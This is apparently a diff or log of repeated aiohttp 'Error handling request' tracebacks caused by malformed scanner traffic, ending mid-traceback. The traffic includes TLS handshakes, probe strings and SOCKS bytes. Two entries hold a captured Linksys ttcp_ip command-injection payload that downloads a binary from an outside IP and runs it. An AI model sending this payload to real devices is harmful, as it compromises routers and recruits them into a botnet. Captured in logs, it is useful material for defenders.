+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01$\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+kaizen.mpsl%3B+wget+http%3A%2F%2F176.65.149.168%2Fbins%2Fkaizen.mpsl%3B+chmod+777+kaizen.mpsl%3B+.%2Fkaizen.mpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1'
+                                                                                                                                                                                                                                     ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Data after `Connection: close`:
+
+    b'\x00'
+          ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x016\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+kaizen.mpsl%3B+wget+http%3A%2F%2F176.65.149.168%2Fbins%2Fkaizen.mpsl%3B+chmod+777+kaizen.mpsl%3B+.%2Fkaizen.mpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1'
+                                                                                                                                                                                                                                     ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x10'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x03'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x10'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x10'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x03\x01\x02\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'238'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x12\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01\x01\xbbh\x10\xb9\xf1'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x05\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x04\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'MGLNDD_47.106.95.116_8080\n'
+       ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Data after `Connection: close`:
+
+    b'\x00'
+          ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Data after `Connection: close`:
+
+    b'\x00'
+          ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x02'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x12\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01\x0c\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'HELP'
+        ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadHttpMessage: 400, message:
+  Pause on PRI/Upgrade:
+
+    b''
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01D\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'\x16\x03\x01'
+      ^
+Error handling request
+Traceback (most recent call last):
+  File "/home/admin/.local/lib/python3.8/site-packages/aiohttp/web_protocol.py", line 332, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+  File "aiohttp/_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
